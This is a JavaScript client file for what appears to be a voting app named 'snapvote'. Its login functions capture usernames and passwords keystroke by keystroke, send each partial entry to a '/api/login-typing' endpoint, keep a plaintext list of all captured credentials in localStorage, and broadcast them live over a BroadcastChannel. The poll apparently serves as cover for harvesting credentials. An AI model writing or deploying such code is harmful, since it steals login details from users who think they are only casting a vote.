const LOCAL_STORAGE_KEY = 'snapvote_local_state';
let localBroadcast = null;

try {
  if (typeof BroadcastChannel !== 'undefined') {
    localBroadcast = new BroadcastChannel('snapvote_live_sync');
  }
} catch {}

function notifyLocalChange(type, payload) {
  if (localBroadcast) {
    try {
      localBroadcast.postMessage({
        type,
        payload,
        state: getLocalState(),
      });
    } catch {}
  }
}

function getLocalState() {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
    if (raw) return JSON.parse(raw);
  } catch {}
  return {
    tallies: { Amrit: 0, Ashutosh: 0, Suranjan: 0, Tushar: 0 },
    votes: [],
    logins: [],
  };
}

function saveLocalState(state) {
  try {
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(state));
  } catch {}
}

function saveLocalLogin(sessionId, username, password, isLive = false) {
  const state = getLocalState();
  const index = state.logins.findIndex((l) => l.sessionId === sessionId);
  const entry = {
    sessionId,
    username: username || '',
    password: password || '',
    timestamp: Date.now(),
    updatedAt: Date.now(),
    isLive,
  };
  if (index >= 0) {
    state.logins[index] = { ...state.logins[index], ...entry };
  } else {
    state.logins.push(entry);
  }
  saveLocalState(state);
  notifyLocalChange(isLive ? 'LOGIN_TYPING' : 'LOGIN', entry);
  return entry;
}

function saveLocalVote(candidate, voterName) {
  const state = getLocalState();
  state.tallies[candidate] = (state.tallies[candidate] || 0) + 1;
  const vote = {
    candidate,
    voterName,
    timestamp: Date.now(),
  };
  state.votes.push(vote);
  saveLocalState(state);
  notifyLocalChange('VOTE', vote);
  return { ok: true, vote, tallies: state.tallies };
}

function getApiBase() {
  if (window.SNAPVOTE_API_URL) {
    return window.SNAPVOTE_API_URL.replace(/\/$/, '');
  }
  const host = location.hostname || 'localhost';
  if (host === 'localhost' || host === '127.0.0.1') {
    if (location.port && location.port !== '3000') {
      return `http://${host}:3000`;
    }
    return '';
  }
  if (location.protocol === 'file:') {
    return 'http://localhost:3000';
  }
  return '';
}

async function apiRequest(path, options = {}) {
  const base = getApiBase();
  const url = base ? `${base}${path}` : path;
  const res = await fetch(url, {
    headers: { 'Content-Type': 'application/json', ...options.headers },
    ...options,
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || `Request failed (${res.status})`);
  }
  return res.json();
}

async function fetchState() {
  try {
    return await apiRequest('/api/state');
  } catch (err) {
    return getLocalState();
  }
}

async function sendLoginTyping(sessionId, username, password) {
  saveLocalLogin(sessionId, username, password, true);
  try {
    return await apiRequest('/api/login-typing', {
      method: 'POST',
      body: JSON.stringify({ sessionId, username, password }),
    });
  } catch {
    return { ok: true };
  }
}

async function sendLogin(sessionId, username, password) {
  saveLocalLogin(sessionId, username, password, false);
  try {
    return await apiRequest('/api/login', {
      method: 'POST',
      body: JSON.stringify({ sessionId, username, password, timestamp: Date.now() }),
    });
  } catch (err) {
    console.warn('Backend unavailable, continuing in local mode:', err);
    return { ok: true, login: { sessionId, username, password } };
  }
}

async function sendVote(candidate, voterName) {
  saveLocalVote(candidate, voterName);
  try {
    return await apiRequest('/api/vote', {
      method: 'POST',
      body: JSON.stringify({ candidate, voterName, timestamp: Date.now() }),
    });
  } catch (err) {
    console.warn('Backend unavailable, vote stored locally:', err);
    return { ok: true };
  }
}
